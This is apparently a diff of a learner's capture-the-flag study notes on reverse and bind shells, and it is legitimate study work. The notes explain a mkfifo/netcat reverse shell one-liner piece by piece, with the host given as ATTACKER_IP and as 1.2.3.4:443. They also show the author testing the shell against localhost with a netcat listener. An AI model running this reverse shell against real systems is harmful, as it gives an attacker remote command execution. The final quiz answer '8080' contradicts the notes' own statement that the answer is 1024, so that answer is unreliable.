@@ -63,12 +63,123 @@ One example
 `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
 ```
 
-Explanation (Copied directly / needs revision)
+**`rm -f /tmp/f`**
+Ensures nothing is in `/tmp/f` which in turn allows the creation of the pipe
 
-> `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
-> `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
-> `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
-> `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
-> `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
-> `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
+**`mkfifo /tmp/f`**
+Creates named pipe at `/tmp/f`. This allows bi-directional communication between processes.
 
+**`cat /tmp/f`**
+Reads the content of `/tmp/f` as a stream. Since it's its a file pipe, it will never completed.
+
+**`| bash -i 2>&1`**
+Any output from `cat` will be piped directly into an interactive bash shell (`bash -i`)., whilst `2>&1` essentially outputs stderr to to stdout, or in other terms, returns to the attacker, rather than the target.
+
+**`| nc 1.2.3.4 443 >/tmp/f`**
+This will then pipe the target shell to the attackers netcat session using the IP and port provided. 
+
+**`>/tmp/f`**
+Finally any output is parsed back to the file to complete bi-directional communication. 
+
+Now the question is, can I exploit this on my own laptop? Lets try
+
+This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
+
+### Personal Exercise
+Otherwise known as an ADHD tangent ;)
+
+**Set up NC listener**
+```shell
+[archibold@ARCHIBOLD ~]$ nc 127.0.0.1 443
+bash: nc: command not found
+```
+
+Well to start, I forgot the `-lvnp` arguments, but more critical, I don't even have _Netcat_ installed.
+
+```shell
+[archibold@ARCHIBOLD ~]$ sudo pacman -S nc
+[sudo] password for archibold: 
+error: target not found: nc
+```
+
+Okay, so maybe arch doesn't have nc... Maybe if I used the full name I might have more luck ;)
+```shell
+[archibold@ARCHIBOLD ~]$ sudo pacman -S netcat
+:: There are 2 providers available for netcat:
+:: Repository extra
+   1) gnu-netcat  2) openbsd-netcat
+
+Enter a number (default=1): 
+resolving dependencies...
+looking for conflicting packages...
+
+Packages (1) gnu-netcat-0.7.1-10
+
+Total Download Size:   0.03 MiB
+Total Installed Size:  0.06 MiB
+
+:: Proceed with installation? [Y/n] 
+:: Retrieving packages...
+ gnu-netcat-0.7.1-10-x86_64                 30.1 KiB   131 KiB/s 00:00 [########################################] 100%
+(1/1) checking keys in keyring                                         [########################################] 100%
+(1/1) checking package integrity                                       [########################################] 100%
+(1/1) loading package files                                            [########################################] 100%
+(1/1) checking for file conflicts                                      [########################################] 100%
+(1/1) checking available disk space                                    [########################################] 100%
+:: Processing package changes...
+(1/1) installing gnu-netcat                                            [########################################] 100%
+:: Running post-transaction hooks...
+(1/2) Arming ConditionNeedsUpdate...
+(2/2) Updating the info directory file...
+```
+
+Okay I went for the default _Netcat_ provider `gnu-netcat`. It looks to be installed, let's see if we can start the listener again...
+
+```shell
+[archibold@ARCHIBOLD ~]$ nc -lvnp 127.0.0.1 443
+Error: Invalid local port: 127.0.0.1
+[archibold@ARCHIBOLD ~]$ nc -lvnp 443
+Error: Couldn`t setup listening socket (err=-3)
+[archibold@ARCHIBOLD ~]$ sudo nc -lvnp 443
+
+
+```
+
+Okay, so there was some trial and error, first I put in the IP and port, apparently 127.0.0.1 wasn't a valid port. I wonder why. 
+
+Then I tried running _`nc`_ without elevated privileges. That wasn't going to work...
+
+Third times a charm. 
+
+So now I have the listener working, I can try and get the reverse shell working.
+
+### Starting Reverse Shell
+This may not may or may not work on a local machine, but honestly I don't see why not so I'm going to try anyway.
+
+`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 127.0.0.1 443 >/tmp/f`
+
+Amazing, worked first time. For reference, the left window is the reverse shell whilst the right window is the listener or bind shell
+![](Images/Pasted%20image%2020250622113920.png)
+
+Interestingly, you can't just `sudo` as _`sudo`_ wants the password entered on the host machine. 
+![](Images/Pasted%20image%2020250622114147.png)
+
+
+
+### ❓ Question
+> What type of shell opens a specific port on the target for incoming connections from the attacker?
+#### 🧪 Process
+The bind shell
+
+Trying this as the answer
+#### ✅ Answer
+- `bind shell` ✅
+
+### ❓ Question
+> Listening below which port number requires root access or privileged permissions?
+#### 🧪 Process
+Oh I missed this, so apparently ports below **`1024`** require elevated privileges, hence why my example needed elevation, since I used port 443.
+
+Trying this as the answer
+#### ✅ Answer
+- `8080`
